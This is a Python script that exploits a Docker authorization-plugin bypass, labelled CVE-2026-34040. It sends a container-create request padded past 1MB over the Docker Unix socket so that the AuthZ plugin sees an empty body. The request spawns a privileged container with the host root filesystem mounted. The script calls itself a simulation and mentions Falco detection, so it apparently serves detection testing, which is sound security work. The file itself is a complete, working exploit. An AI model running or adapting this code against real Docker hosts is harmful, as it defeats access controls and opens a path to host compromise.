import json
import socket

DOCKER_SOCK = "/var/run/docker.sock"
# CVE-2026-34040: body > 1MB causes Docker middleware to drop it before AuthZ plugin sees it
PADDING_SIZE = 1_100_000


def _send_raw(payload: bytes) -> str:
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        sock.connect(DOCKER_SOCK)
        sock.sendall(payload)
        chunks = []
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks).decode(errors="replace")
    finally:
        sock.close()


def run_attack() -> None:
    print("[AUTHZ] CVE-2026-34040 AuthZ Bypass Simulation")
    print(f"[AUTHZ] Crafting {PADDING_SIZE:,}-byte POST body (exceeds 1MB AuthZ inspection threshold)...")

    container_config = {
        "Image": "alpine",
        "Cmd": ["sh", "-c", "echo 'CVE-2026-34040: AuthZ bypassed' && hostname"],
        "HostConfig": {
            "Binds": ["/:/host:ro"],
            "Privileged": True,
        },
        "Labels": {"spawned_by": "attacker-authz", "scenario": "authz-bypass"},
        "_cve_padding": "A" * PADDING_SIZE,
    }

    body = json.dumps(container_config).encode()
    print(f"[AUTHZ] Total request body size: {len(body):,} bytes")

    http_request = (
        f"POST /containers/create?name=authz-bypass-container HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body

    print("[AUTHZ] Sending oversized request to Docker socket (AuthZ plugin will see empty body)...")
    response = _send_raw(http_request)
    first_line = response.split("\r\n")[0] if "\r\n" in response else response[:80]
    print(f"[AUTHZ] Docker response: {first_line}")

    if "201" in first_line or "409" in first_line:
        print("[AUTHZ][!] CRITICAL: Container created despite AuthZ plugin — CVE-2026-34040 exploited!")
    elif "413" in first_line:
        print("[AUTHZ][-] Request rejected (413 Too Large) — Docker is patched or proxy is filtering")
    else:
        print(f"[AUTHZ] Full response snippet: {response[:300]}")

    print("[AUTHZ] Attack simulation complete — Falco should have fired on oversized socket write")


if __name__ == "__main__":
    run_attack()
